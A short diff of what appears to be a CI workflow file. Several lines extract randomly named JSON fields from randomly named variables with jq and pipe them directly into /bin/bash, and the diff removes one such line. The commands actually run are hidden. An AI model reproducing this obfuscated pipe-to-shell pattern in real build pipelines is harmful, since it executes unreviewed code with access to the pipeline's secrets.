@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$tdn7948" | jq -r .rrnbk07010 | /bin/bash
           printf '%s' "$t3" | jq -r .tipbc1448 | /bin/bash
           printf '%s' "$e4" | jq -r .vydhf3 | /bin/bash
-          echo $pa3 | jq -r .voqy17 | /bin/bash
           echo $tqq56903 | jq -r .n36 | /bin/bash
 
       - name: Upload output
